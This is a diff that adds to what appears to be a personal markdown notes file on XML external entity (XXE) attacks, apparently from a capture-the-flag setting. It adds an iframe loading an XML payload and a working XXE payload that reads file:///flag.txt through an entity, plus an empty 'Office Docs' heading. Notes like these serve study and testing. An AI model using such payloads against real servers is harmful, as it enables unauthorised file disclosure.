@@ -98,3 +98,20 @@ Content-Type: application/xml
 
 # Via SSRF
 
+```
+<iframe src=./iframe-payload.xml>
+```
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE payload [<!ENTITY xxe SYSTEM "file:///flag.txt" >]>
+<request>
+  <search>&xxe;</search>
+</request>
+```
+
+# Office Docs
+
+![[Pasted image 20241215162646.png]]
+
+
